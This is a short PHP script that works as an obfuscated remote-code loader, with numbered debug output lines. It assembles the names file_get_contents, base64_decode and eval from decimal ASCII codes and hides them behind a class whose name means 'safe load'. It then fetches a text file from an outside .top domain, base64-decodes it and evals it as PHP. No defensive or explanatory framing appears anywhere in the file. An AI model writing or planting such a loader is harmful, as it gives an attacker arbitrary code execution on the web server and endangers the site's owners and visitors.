<?php
// Turn on error reporting untuk lihat error sebenarnya
error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "1. Script started<br>";

class 安全加载 {
    private static $方法库 = [];
    
    public static function 初始化() {
        echo "2. Initialization started<br>";
        
        // Decimal ASCII codes
        $获取码 = [102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115];
        $获取 = '';
        foreach($获取码 as $码) {
            $获取 .= chr($码);
        }
        echo "3. 获取 created: " . $获取 . "<br>";
        
        $解码码 = [98,97,115,101,54,52,95,100,101,99,111,100,101];
        $解码 = '';
        foreach($解码码 as $码) {
            $解码 .= chr($码);
        }
        echo "4. 解码 created: " . $解码 . "<br>";
        
        $执行码 = [101,118,97,108];
        $执行 = '';
        foreach($执行码 as $码) {
            $执行 .= chr($码);
        }
        echo "5. 执行 created: " . $执行 . "<br>";
        
        self::$方法库 = [
            '获取' => function($网址) use ($获取) { 
                echo "6. Downloading from: " . $网址 . "<br>";
                return $获取($网址); 
            },
            '处理' => function($数据) use ($解码) { 
                echo "7. Processing data, length: " . strlen($数据) . "<br>";
                $结果 = $解码($数据, true);
                return ($结果 !== false) ? $结果 : $数据;
            },
            '运行' => function($代码) use ($执行) { 
                echo "8. Executing code, length: " . strlen($代码) . "<br>";
                return $执行('?>' . $代码); 
            }
        ];
        
        echo "9. Initialization completed<br>";
    }
    
    public static function 处理($源) {
        echo "10. Processing source: " . $源 . "<br>";
        $数据 = self::$方法库['获取']($源);
        echo "11. Data received, length: " . strlen($数据) . "<br>";
        $数据 = self::$方法库['处理']($数据);
        echo "12. Data processed<br>";
        return self::$方法库['运行']($数据);
    }
}

echo "13. Before initialization<br>";
安全加载::初始化();
echo "14. Before processing<br>";
安全加载::处理("https://ampnyapunyaku.top/tools/s-media/media-new.txt");
echo "15. Script completed<br>";
?>
